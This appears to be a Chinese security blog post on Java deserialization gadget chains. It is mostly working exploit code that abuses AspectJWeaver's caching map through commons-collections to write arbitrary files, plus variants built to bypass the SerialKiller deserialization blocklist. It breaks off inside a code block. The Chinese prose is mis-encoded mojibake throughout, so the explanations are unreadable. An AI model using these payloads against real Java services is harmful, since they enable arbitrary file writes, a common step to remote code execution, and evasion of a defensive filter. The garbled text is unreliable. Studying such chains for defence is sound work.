<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#put</code> ä¼šå°† <code>value</code> ä½œä¸ºå†…å®¹ï¼ˆå¼ºè½¬ä¸º <code>byte[]</code>ï¼‰å†™å…¥æ–‡ä»¶ <code>&lt;folder&gt;/&lt;key&gt;</code> ä¸­ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†ä¸€æ¡ (key -&gt; byte[]) å†™å…¥â€œç£ç›˜åå¤‡â€ç¼“å­˜ï¼š</span></span><br><span class="line"><span class="comment">// 1) è‹¥ value ç­‰äºå“¨å…µ SAME_BYTESï¼Œåˆ™ä¸è½ç›˜ï¼Œåªåœ¨ Map é‡Œå­˜å…¥ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸² SAME_BYTES_STRINGï¼›</span></span><br><span class="line"><span class="comment">// 2) å¦åˆ™æŠŠå­—èŠ‚å†™åˆ° folder/key æ–‡ä»¶é‡Œï¼ŒMap é‡Œå­˜å…¥ (key -&gt; è¯¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„)ï¼›</span></span><br><span class="line"><span class="comment">// 3) è°ƒç”¨ storeMap()ï¼ˆå¸¦èŠ‚æµï¼‰æŠŠâ€œç´¢å¼•â€ï¼ˆæ•´ä¸ª Map è‡ªèº«ï¼‰åºåˆ—åŒ–åˆ° folder/CACHENAMEIDXã€‚</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] valueBytes = (<span class="type">byte</span>[]) value;         <span class="comment">// çº¦å®š value å¿…é¡»æ˜¯ byte[]ï¼Œå¦åˆ™ä¼šæŠ›ç±»å‹è½¬æ¢å¼‚å¸¸</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123; <span class="comment">// è‹¥ä¸é¢„è®¾çš„â€œå“¨å…µå­—èŠ‚â€å®Œå…¨ç›¸åŒ</span></span><br><span class="line">            path = SAME_BYTES_STRING;               <span class="comment">// åªè®°ä¸€ä¸ªæ ‡è®°å­—ç¬¦ä¸²ï¼Œé¿å…ä¸ºè¯¥å€¼åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å°†å­—èŠ‚å†…å®¹å†™å…¥ç£ç›˜æ–‡ä»¶ï¼ˆè·¯å¾„ä¸º folder + File.separator + keyï¼‰</span></span><br><span class="line">            <span class="comment">// è¿”å›å†™å…¥æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œä¹‹åå­˜å…¥ Map</span></span><br><span class="line">            path = writeToPath((String) key, valueBytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// çœŸæ­£å­˜å…¥çˆ¶ç±» Mapï¼ˆè¿™é‡Œé€šå¸¸æ˜¯ HashMapï¼‰ï¼šé”®æ˜¯ä¼ å…¥çš„ keyï¼Œå€¼æ˜¯ &quot;è·¯å¾„å­—ç¬¦ä¸²&quot; æˆ– &quot;SAME_BYTES_STRING&quot;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.put(key, path);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°è¯•æŠŠâ€œç´¢å¼•â€ï¼ˆæ•´ä¸ª Map å¯¹è±¡ï¼‰åºåˆ—åŒ–åˆ°ç£ç›˜ï¼›</span></span><br><span class="line">        <span class="comment">// storeMap() å†…éƒ¨æŒ‰ storingTimer åšèŠ‚æµï¼šè·ç¦»ä¸Šæ¬¡å†™ç›˜æœªè¶…è¿‡é˜ˆå€¼åˆ™è·³è¿‡ï¼Œé™ä½ I/O é¢‘ç‡</span></span><br><span class="line">        storeMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result; <span class="comment">// è¿”å›æ—§å€¼ï¼ˆHashMap çš„è¯­ä¹‰ï¼‰ï¼Œæˆ– null</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// ä»»ä½•å†™æ–‡ä»¶/åºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„ I/O å¼‚å¸¸éƒ½ä¼šåˆ°è¿™é‡Œ</span></span><br><span class="line">        trace.error(<span class="string">&quot;Error inserting in cache: key:&quot;</span> + key.toString() + <span class="string">&quot;; value:&quot;</span> + value.toString(), e);</span><br><span class="line">        Dump.dumpWithException(e);  <span class="comment">// é¢å¤–è½¬å‚¨ä»¥ä¾¿è¯Šæ–­</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">writeToPath</span><span class="params">(String key, <span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ç›®æ ‡æ–‡ä»¶ï¼šfolder ä½œä¸ºç¼“å­˜æ ¹ç›®å½•ï¼Œkey ç›´æ¥ä½œä¸ºæ–‡ä»¶å/ç›¸å¯¹å­è·¯å¾„ï¼ˆè°ƒç”¨æ–¹éœ€ä¿è¯ key åˆæ³•ï¼‰</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fullPath</span> <span class="operator">=</span> folder + File.separator + key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å¼€è¾“å‡ºæµå¹¶å†™å…¥å­—èŠ‚ï¼ˆè¦†ç›–å†™ï¼‰</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fullPath);</span><br><span class="line">    fos.write(bytes);</span><br><span class="line">    fos.flush();   <span class="comment">// ä¸»åŠ¨åˆ·æ–°ç¼“å†²ï¼ˆclose() ä¹Ÿä¼šåˆ·æ–°ï¼‰</span></span><br><span class="line">    fos.close();   <span class="comment">// åŠæ—¶å…³é—­é‡Šæ”¾å¥æŸ„</span></span><br><span class="line">    <span class="keyword">return</span> fullPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>StoreableCachingMap</code> çš„æ„é€ å‡½æ•°å±æ€§ä¸º <code>private</code>ï¼Œå› æ­¤éœ€è¦åå°„è°ƒç”¨ã€‚å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•° <code>folder</code> å¯ä»¥å†™æ–‡ä»¶è·¯å¾„ï¼Œ<code>storingTimer</code> å¯¹ä¸å†™æ–‡ä»¶é€»è¾‘æ— å½±å“ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">StoreableCachingMap</span><span class="params">(String folder, <span class="type">int</span> storingTimer)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.folder = folder;</span><br><span class="line">    initTrace();</span><br><span class="line">    <span class="built_in">this</span>.storingTimer = storingTimer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨ä»£ç -5"><a href="#åˆ©ç”¨ä»£ç -5" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AspectJWeaver</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String path, <span class="type">byte</span>[] content)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clz = Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ctor = clz.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> (Map) ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(content));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, path);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        triggerSet.add(entry);</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;map&quot;</span>, innerMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerSet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String path, <span class="type">byte</span>[] content) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(path, content));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;hahaha&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getDeclaredField(object.getClass(), fieldName).set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="SerialKiller-ç»•è¿‡"><a href="#SerialKiller-ç»•è¿‡" class="headerlink" title="SerialKiller ç»•è¿‡"></a>SerialKiller ç»•è¿‡</h3><p>ç”±äº <code>ConstantTransformer</code> åœ¨ SerialKiller ä¸­è¢« ban äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾èƒ½æ›¿ä»£çš„ <code>Transformer</code> å¯¹è±¡ã€‚<code>ConstantTransformer</code> ä½œç”¨æ˜¯è°ƒç”¨ <code>transform</code> æ–¹æ³•çš„æ—¶å€™è¿”å›ä¸€ä¸ªå›ºå®šçš„å€¼ï¼ˆ<code>byte[]</code> ç±»å‹ï¼‰ï¼Œå› æ­¤å±‹é¢éœ€è¦æ‰¾èƒ½è¾¾åˆ°åŒç­‰æ•ˆæœä¸”å®ç°äº† <code>Transformer</code> çš„ç±»ã€‚</p>
<h4 id="MapTransformer"><a href="#MapTransformer" class="headerlink" title="MapTransformer"></a>MapTransformer</h4><p><code>org.apache.commons.collections.functors.MapTransformer</code> åŒ…è£…äº†ä¸€ä¸ª <code>Map</code> å¯¹è±¡ <code>iMap</code>ï¼Œç„¶åå®ƒçš„ <code>transform</code> æ–¹æ³•ä¼šæ ¹æ®å‚æ•° <code>input</code> åœ¨ <code>iMap</code> ä¸­æŸ¥è¯¢å¯¹åº”çš„å€¼ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map iMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ConstantTransformer.NULL_INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapTransformer</span>(map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">MapTransformer</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMap = map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iMap.get(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæˆ‘ä»¬ä¼ å…¥ <code>transform</code> çš„å‚æ•°ä¸ºæ–‡ä»¶åæ˜¯å›ºå®šçš„ï¼Œå› æ­¤å¯ä»¥ç”¨å®ƒä»£æ›¿ <code>ConstantTransformer</code> è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String path, <span class="type">byte</span>[] content)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class&lt;?&gt; clz = Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; ctor = clz.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">    ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> (Map) ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">transMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    transMap.put(path, content);</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> MapTransformer.getInstance(transMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, path);</span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">    triggerSet.add(entry);</span><br><span class="line"></span><br><span class="line">    setFieldValue(outerMap, <span class="string">&quot;map&quot;</span>, innerMap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> triggerSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h4><p><code>org.apache.commons.collections.functors.FactoryTransformer</code> ä¿å­˜ä¸€ä¸ª <code>org.apache.commons.collections.Factory</code> å¯¹è±¡ <code>iFactory</code>ï¼Œè°ƒç”¨ <code>transform</code> æ–¹æ³•è¿”å›çš„æ˜¯ <code>iFactory.create()</code> çš„ç»“æœã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Factory iFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FactoryTransformer</span><span class="params">(Factory factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iFactory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iFactory.create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæˆ‘ä»¬éœ€è¦å¯»æ‰¾åˆé€‚çš„ <code>Factory</code> æ¥å£çš„å®ç°ç±»ï¼Œä¸” <code>create</code> æ–¹æ³•çš„è¿”å›å€¼å¯æ§ã€‚</p>
<p>ç”±äº <code>Factory</code> æ¥è‡ªäº commons-collections åº“ï¼Œå› æ­¤è¿™ä¸ªæ¥å£çš„å®ç°ç±»å…¨éƒ½æ¥è‡ªäº commons-collections åº“ï¼Œå¹¶ä¸”ç®€å•åˆ†æä¸€ä¸‹å‘ç°å¾ˆå¤šå®ç°ç±»éƒ½æ»¡è¶³æ¡ä»¶ã€‚</p>
<p>è¿™é‡Œåªåˆ—ä¸¾ä¸€ä¸ªæœ€ç®€å•çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ <code>org.apache.commons.collections.functors.ConstantFactory</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantFactory</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String path, <span class="type">byte</span>[] content)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class&lt;?&gt; clz = Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; ctor = clz.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">    ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> (Map) ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">transMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    transMap.put(path, content);</span><br><span class="line"></span><br><span class="line">   <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryTransformer</span>(<span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(content));</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, path);</span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">    triggerSet.add(entry);</span><br><span class="line"></span><br><span class="line">    setFieldValue(outerMap, <span class="string">&quot;map&quot;</span>, innerMap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> triggerSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h2><p>åˆ©ç”¨ <code>AspectJWeaver</code> ä»»æ„æ–‡ä»¶å†™åï¼Œå‘ç°åŒç›®å½•ä¸‹å‡ºç°äº†ä¸€ä¸ª <code>cache.idx</code> æ–‡ä»¶ã€‚</p>
<p>è¿™æ˜¯å› ä¸º <code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#put</code> å‡½æ•°ä¼šè°ƒç”¨ <code>storeMap</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] valueBytes = (<span class="type">byte</span>[]) value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123;</span><br><span class="line">            path = SAME_BYTES_STRING;</span><br><span 